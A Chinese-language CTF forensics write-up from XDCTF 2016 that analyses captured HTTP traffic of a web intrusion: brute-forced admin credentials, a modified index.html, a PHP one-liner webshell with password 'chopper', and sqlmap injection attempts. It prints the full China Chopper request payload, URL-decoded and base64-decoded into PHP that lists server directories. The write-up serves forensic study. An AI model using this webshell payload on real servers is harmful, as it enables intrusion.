---
title: XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）
date: 2016-10-05 00:33:21
tags:  
 - writeup
 - web
---

### 分析
题目如下

{% asset_img  title.jpg  %}

下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的）

下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap
{% asset_img  sum1.png  %}

{% asset_img  sum2.png  %}

使用wireshark打开分析，在文件-＞导出对象－＞HTTP 中发现敏感的登陆页面，并且多次出现，猜测应该是黑客爆破的登陆页面。
{% asset_img  http.png  %}

接着使用过滤规则`http and ((ip.src == 219.239.105.18 and ip.dst == 172.16.61.210) or (ip.src == 172.16.61.210 and ip.dst == 219.239.105.18))`，仔细分析对应的HTTP攻击流量。

然而wireshark还是太麻烦了。。。 做起来太耗时间，想着能否有一个工具可以提取出pcap数据包中对应的IP的HTTP协议数据包，把heard 和 body 都提出来。

找了一下发现一个神器[https://github.com/caoqianli/httpcap#usage](https://github.com/caoqianli/httpcap#usage)

安装完毕后，使用其进行数据包分析，首先提取我们迫切需要的数据。

`parse-pcap -i 219.239.105.18 -vvv sum.pcap > 1.html`

然后使用notepad++对其进行手工分析（数据量已经很少了。

找到关键数据,用户名为root 密码为 123456  题一、题二已经解决。


{% asset_img  login.png  %}


发现黑客进入后台后，修改的页面为index.html，题三解决

{% asset_img  file.png  %}

如下图可以看到，黑客已经将一句话木马写入web服务器，且其口令为`chopper`，完整连接地址为`http://118.194.196.232/index.php?m=search`,题四、题五解决。通过查看返回包得知其执行的命令为pwd，查看当前目录绝对路径的命令。

{% asset_img  muma.png  %}

继续往下分析。发现其查看了目录文件，继而返回去分析其命令。

{% asset_img  muma2.png  %}

`chopper=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=L3Zhci93d3cvaHRtbC8%3D
`

url解码

`chopper=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=L3Zhci93d3cvaHRtbC8=`

z0为
```
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo(Ii0 |");;$D=base64_decode($_POST["z1"]);$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."
";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();
```
z1为
`/var/www/html/`

可知其查看的第一个文件目录为`/var/www/html`，第六个问题解决。

发现数据还没查看玩，继续拉下去分析。。。。竟然发现了sqlmap跑包的数据，特么一句话都有了，还搞sqlmap干啥？？？ - -。。。


如下图，大量对`http://118.194.196.232:8090/webmail/userapply.php?execadd=111&DomainID=111`的`Domain`参数进行sql注入尝试的http数据包。然而并没有什么软用
{% asset_img  sqlmap.png  %}


